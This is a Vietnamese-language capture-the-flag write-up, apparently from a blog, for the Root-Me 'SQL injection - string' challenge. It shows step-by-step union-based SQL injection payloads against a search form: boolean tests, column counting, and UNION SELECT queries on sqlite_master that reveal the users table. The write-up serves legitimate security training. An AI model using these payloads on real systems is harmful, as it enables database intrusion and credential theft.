<main class="main has-sticky" role="main">
    <div class="content">
        <article id="post-sql1" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    [SQLI] SQLi String
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a></div>
            </div>
            <div class="article-entry marked-body" itemprop="articleBody">
                <h1 id="Thu-Thach"><a href="#Thu-Thach" class="headerlink" title="Thử Thách"></a>Thử Thách</h1>
                <p>URL: <a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-string" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-string</a></p>
                <h2 id="Tieu-de"><a href="#Tieu-de" class="headerlink" title="Tiêu đề"></a>Tiêu đề</h2>
                <p>CMS v 0.0.2</p>
                <h2 id="Mo-ta"><a href="#Mo-ta" class="headerlink" title="Mô tả"></a>Mô tả</h2>
                <p>Retrieve the administrator password</p>
                <button id="read-writeup"><span><img src="public/images/more.png" /></span>Xem Hướng Dẫn</button>
                <p style="color: red; margin-left: 10px; font-weight: bold">Hãy cố gắng tự làm bằng hết sức mình trước, xem hướng dẫn ngay từ đầu thì bạn sẽ mất nhiều thứ đó..</p>
                <script type="text/javascript">
                    $(document).ready(function(){
                        $("#read-writeup").click(function(){
                            $("#w-content").toggle();
                        });
                    });
                </script>
                <div id="w-content" style="display: none">
                <h1 id="Huong-Dan"><a href="#Huong-Dan" class="headerlink" title="Hướng Dẫn"></a>Hướng Dẫn</h1>
                <p>Thử cách chức năng xem của website,ta URL có dạng: <a href="http://challenge01.root-me.org/web-serveur/ch19/?action=news&amp;news_id=x" target="_blank" rel="noopener">http://challenge01.root-me.org/web-serveur/ch19/?action=news&amp;news_id=x</a><br>Test thử với:</p>
                <blockquote>
                    <p>news_id= -1' OR 1=1 --#</p>
                </blockquote>
                <p>Thấy không có kết quả,có vẻ nên xem xét các chức năng khác.<br>Ta thấy có chức năng search,tại URL: <a href="http://challenge01.root-me.org/web-serveur/ch19/?action=recherche" target="_blank" rel="noopener">http://challenge01.root-me.org/web-serveur/ch19/?action=recherche</a><br>Form send dưới dạng POST, biến là recherche dưới dạng chuỗi.</p>
                <p>Vậy ta truyền vào action =&gt; Server sẽ query ra bài viết có nội dung tương tự form search, rồi hiển thị ra cho chúng ta.<br>Nhận thấy:</p>
                <ul>
                    <li>Có chỗ hiển thị ra kết quả SELECT (Inline SQLi)</li>
                    <li>Có thể truyền vào dạng chuỗi tại biến <strong>recherche</strong><br>=&gt; Quyết định dùng Union Based SQLi</li>
                </ul>
                <h2 id="Test-loi"><a href="#Test-loi" class="headerlink" title="Test lỗi"></a>Test lỗi</h2>
                <blockquote>
                    <p>asasas' or 1=1 --</p>
                </blockquote>
                <p>Ta thấy có 5 kết quả, vì nó <strong>OR TRUE</strong> nên kết quả vậy tức là dính SQLi.</p>
                <h2 id="Tim-so-cot"><a href="#Tim-so-cot" class="headerlink" title="Tìm số cột."></a>Tìm số cột.</h2>
                <blockquote>
                    <p>a' ORDER BY 2 -- #</p>
                </blockquote>
                <p>Thử với 3 thấy sai, ta biết số cột là 2.</p>
                <h2 id="Union"><a href="#Union" class="headerlink" title="Union"></a>Union</h2>
                <blockquote>
                    <p>asasas' union select 1,2 --</p>
                </blockquote>
                <p>Kết quả: 1 (2)</p>
                <p>Ta biết được HQT CSDL là SQLite lúc nó thông báo lỗi.<br>Ta cần biết tên bảng lưu thông tin người dùng (chắc là users). Nhưng mình hướng dẫn các bạn tìm nó chứ ko đoán.</p>
                <p><strong>Lưu ý</strong>: Bảng lưu thông tin tại MySQL là information.schema thì tại SQLite là <strong>sqlite_master</strong></p>
                <blockquote>
                    <p>asasas' union select name,2 from sqlite_master WHERE type='table' --</p>
                </blockquote>
                <p>Có ngay 2 bảng: news (2), users (2)</p>
                <blockquote>
                    <p>asasas' union select sql,2 from sqlite_master WHERE type='table' --</p>
                </blockquote>
                <p>CREATE TABLE news(id INTEGER, title TEXT, description TEXT) (2)<br>CREATE TABLE users(username TEXT, password TEXT, Year INTEGER) (2)</p>
                <p>Giờ chỉ việc lấy password từ bảng users thôi.</p>
                </div></div>
        </article>
        <section id="comments">
            <div id="vcomments"></div>
        </section>
    </div>
</main>